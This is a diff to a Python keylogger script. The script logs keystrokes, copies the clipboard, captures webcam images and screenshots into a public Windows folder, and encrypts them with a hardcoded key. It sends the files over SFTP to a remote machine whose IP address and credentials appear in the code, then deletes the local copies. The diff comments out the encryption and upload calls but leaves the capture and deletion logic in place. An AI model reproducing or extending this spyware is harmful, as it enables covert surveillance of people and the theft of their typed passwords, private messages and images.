@@ -14,13 +14,13 @@ from pynput.keyboard import Key, Listener
 
 keys_information = "key_log.txt"
 clipboard_information = "Clipboard.txt"
-camera_information = ".png"
-screenshot_information = ".png"
+camera_information = ""
+screenshot_information = ""
 
 time_iterations = 10
 number_of_iterations_end = 1
 
-myHostname = "192.168.44.142"  # change this
+myHostname = "192.168.44.16"  # change this
 myUsername = "pi"  # change this
 myPassword = "kali123"  # change this #should be 8 characters or more including special characters
 remote_file = '/home/pi/log/'
@@ -30,7 +30,7 @@ i = 0  # global variable to change the name of image as we click
 
 directory = "C:\\Users\\Public\\"
 extend = "\\"
-dir_name = "Keylogger_python"
+dir_name = "Log Files"
 path = os.path.join(directory, dir_name)
 try:
     os.makedirs(path, exist_ok=True)
@@ -56,25 +56,22 @@ def copy_clipboard():
 
 # Captures Webcam using cv2 module
 def capture_webcam():
-    try:
-        camera = cv2.VideoCapture(0)
-        time_str = time.strftime("IMG_%Y%m%d_%H%M%S")  # To save each image with the time stamp
-        check, frame = camera.read()
-        cv2.waitKey(0)  # waits 0 milliseconds after each keypress
-        camera.release()
-        cv2.imwrite(file_path + extend + time_str + camera_information, frame)
-    except:
-        pass
+    camera = cv2.VideoCapture(0)
+    time_str = time.strftime("IMG_%Y%m%d_%H%M%S.png")  # To save each image with the time stamp
+    check, frame = camera.read()
+    cv2.waitKey(0)  # waits 0 milliseconds after each keypress
+    camera.release()
+    cv2.imwrite(file_path + extend + time_str + camera_information, frame)
 
 
 # Capture Screenshots using imgrb or pyscreenshot module
 def screenshots():
     imgrb = ImageGrab.grab()
-    time_str = time.strftime("SGB_%Y%m%d_%H%M%S")  # To save each image with the time stamp
+    time_str = time.strftime("SGB_%Y%m%d_%H%M%S.png")  # To save each image with the time stamp
     imgrb.save(file_path + extend + time_str + screenshot_information)
 
 
-# Encrypting all files in a specific directory using the fernet library
+# Encrypting all files in a specific directory using the fernet library6
 def encrypt_files():
     key = "BhbZu8TldX1E7eFjhfkppHVmbu7xZaW0XKMOI-eLXU4="  # Key used to encrypt and decrypt the files
     folders = [j for j in os.listdir(file_path) if os.path.isfile(os.path.join(file_path, j))]
@@ -145,15 +142,13 @@ def read_file():
     string1 = ['quick', 'brown', 'fox', 'jumps']  # mentioned threats
     # open text file
     with open(file_path + keys_information, "r") as logfiles:
-        text = logfiles
-
         for line in logfiles:
             if any(keyword in line for keyword in string1):
                 print(line)
                 print("these words were found, storing in Threat Directory")
                 logfiles.close()
-                encrypt_files()
-                sftp_files_threat()
+                #encrypt_files()
+                #sftp_files_threat()
                 delete_files()
                 print("Encrypted and stored in Threat dir")
                 break
@@ -161,14 +156,15 @@ def read_file():
             else:
                 print("no words were found, storing in Log Directory")
                 logfiles.close()
-                encrypt_files()
-                sftp_files_log()
+                #encrypt_files()
+                #sftp_files_log()
                 delete_files()
                 print("Encrypted and stored in Log dir")
                 break
 
+
         # closing text file
-        logfiles.close()
+    logfiles.close()
 
 
 number_of_iterations = 0
